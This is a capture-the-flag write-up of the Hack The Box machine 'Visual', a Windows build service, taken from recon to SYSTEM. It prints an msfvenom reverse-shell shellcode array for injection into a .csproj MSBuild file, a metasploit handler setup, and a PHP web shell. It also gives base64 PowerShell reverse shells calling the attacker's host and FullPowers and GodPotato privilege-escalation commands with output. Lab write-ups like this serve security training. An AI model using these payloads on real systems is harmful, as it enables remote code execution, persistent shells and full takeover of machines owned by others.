---
title: "Visual"
tags:
    - machine
    - git
date: "2024-02-24"
thumbnail: "/assets/img/thumbnail/Visual.png"
bookmark: true
---


# Description
---

<img src="/assets/img/thumbnail/Visual.png" alt="drive">

# Solution
---
## Recon

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/visual]
└─$ nmap -sV -sC -Pn -oA nmap/visual 10.10.11.234             
# Nmap 7.92 scan initiated Sat Sep 30 21:32:35 2023 as: nmap -sV -sC -Pn -oA visual 10.10.11.234
Nmap scan report for 10.10.11.234
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 30 21:33:23 2023 -- 1 IP address (1 host up) scanned in 48.53 seconds
```

## shell as enox

When we open the site `http://10.10.11.234` we get this
<img src="/assets/img/htb/visual/Capture.JPG" alt="home page">
As said the site can accept a repo of dotnet6 and it will trust the project we sent, execute it and send the DLL back as example
first i wanted to test it using a random C# project repo but note that we can't submit the url of the repo directly and this because the lan at which the HTB machine exists isn't connected to Internet so we need to submit this repo over the lan.
After searching i found this <a href="https://theartofmachinery.com/2016/07/02/git_over_http.html">article</a> about how to serve a repo over http.

I created a simple C# project that prints hello world xDDD and uploaded this repo on github. Its path is `https://github.com/YoussifSeliem/visualHTB` then i cloned this repo into my machine `git clone https://github.com/YoussifSeliem/visualHTB`
Then let's start as in article

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/visual/tst]
└─$ git --bare clone visualHTB repo-http
cd repo-http/.git
git --bare update-server-info
mv hooks/post-update.sample hooks/post-update
cd ..
python -m http.server 8000
```

Then I submitted the repo into the site by submitting this link `http://10.10.16.81:8000/.git/`, then i got this
<img src="/assets/img/htb/visual/Capture1.JPG" alt="success1">
Now we need to move forward in this machine and we can make use of the way the project is handled by the site as it's got trusted and executed.
After searching i found many useful articles like <a href="https://www.hackingarticles.in/windows-exploitation-msbuild/">MSBuild</a> & <a href="">evilSLN</a>.
I used MSBuild exploit, it makes use of the fact that visual studio uses MSBuild.
Briefly, we can say that MSBuild is an engine that provides an XML schema for a project file that controls how the build platform processes and builds software.
In our case the **.csprog** file contains MSBuild XML code.
I moved as in the article and created the shell code using 

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/visual]
└─$ msfvenom -p windows/shell/reverse_tcp lhost=10.10.16.81 lport=4444 -f csharp

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of csharp file: 1825 bytes
byte[] buf = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,
0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x01,0xd3,0x50,0x8b,0x48,0x18,
0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,
0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,
0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x10,0x51,0x68,0x02,
0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,
0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,
0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,
0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,
0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,
0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
```

I made the payload shell rather than meterpreter because in this machine the AntiVirus detected the meterpreter and closed the connection.
Add the generated shell code to the .csproj file as shown in the article and this is our modified repo we will submit it again to the site.
don't forget to set up a listener in msfconsole

```bash
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.16.81
msf exploit(multi/handler) > set lport 4444
msf exploit(multi/handler) > exploit
```

Then you will get the connection

```shell
C:\Windows\Temp\591812c6a390d3b1c93cef7b9d4df5\ConsoleApp1>whoami
whoami
visual\enox
```

I found on the system there is only enox user then i went to its Desktop to get the user flag

```shell
C:\Users\enox\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 82EF-5600

 Directory of C:\Users\enox\Desktop

06/10/2023  12:10 PM    <DIR>          .
06/10/2023  12:10 PM    <DIR>          ..
02/23/2024  03:07 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,479,344,128 bytes free

C:\Users\enox\Desktop>type user.txt
type user.txt
7******************************
```

## shell as local service

After navigation in the machine we can see C:\xampp\htdocs which is the root of web directory this gives us an idea of getting shell from it because the web service possess **ImpersonatePrivilege** permissions. These permissions can potentially be exploited for privilege escalation.

To get shell as local service i created a simple webshell

```php
<?php
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Then i uploaded it to this path `C:\xampp\htdocs\uploads` and then accessed the shell from the site like this
<img src="/assets/img/htb/visual/Capture2.JPG" alt="webshell">
It works so Let's get the shell as the local service.
We can use <a href="https://www.revshells.com/">rev shell generator</a> and from it i choosed powershell#3 (base64), then i set up the listener and send this payload in the url 

```http
http://10.10.11.234/uploads/shell.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

and we got the shell

```shell
connect to [10.10.16.81] from (UNKNOWN) [10.10.11.234] 49960
whoami
nt authority\local service

PS C:\xampp\htdocs\uploads> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## shell as root

As we see `SeImpersonatePrivilege` doesn't exist and this moves us to use <a href="https://github.com/itm4n/FullPowers">FullPower</a> that helps in recovering the privilages.

After Downloading the tool and sending it to the victim machine we can use it to get a shell as the local service but with full privilages like this

```shell
PS C:\xampp\htdocs\uploads> .\FullPowers.exe -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

We got the shell with full privilages as shown below

```shell
whoami
nt authority\local service
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

Now we can exploit `SeImpersonatePrivilege` to get access to System user
We will use <a href="https://github.com/BeichenDream/GodPotato">potato</a> for that.
God potato is a version of it and the latest one as the previous versions were for the same purpose but are patched.
Download the script and send it to victim as before, then we can use it to execute commands as system. 
We can get a reverse shell as System or read flag directly as shown below


```shell
PS C:\xampp\htdocs\uploads>  .\GodPotato-NET4.exe -cmd "cmd /c whoami"                                      
[*] CombaseModule: 0x140708928421888
[*] DispatchTable: 0x140708930728048
[*] UseProtseqFunction: 0x140708930104224
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\5d3b54b0-a045-4fd9-b2cc-24a3eec17d49\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a402-1398-ffff-b3ec-b92af9a77b95
[*] DCOM obj OXID: 0x995333262ce97ff6
[*] DCOM obj OID: 0xc0dd9e4d9e40b97c
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 868 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1856
nt authority\system


PS C:\xampp\htdocs\uploads> .\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
[*] CombaseModule: 0x140708928421888
[*] DispatchTable: 0x140708930728048
[*] UseProtseqFunction: 0x140708930104224
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\a6093430-876f-4fd6-9001-b4b9a94a7b1b\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004002-120c-ffff-6bc9-00a5ef395859
[*] DCOM obj OXID: 0xc5cf60320db2d932
[*] DCOM obj OID: 0xd1be762d7a08c269
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 868 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 956
3******************************b
```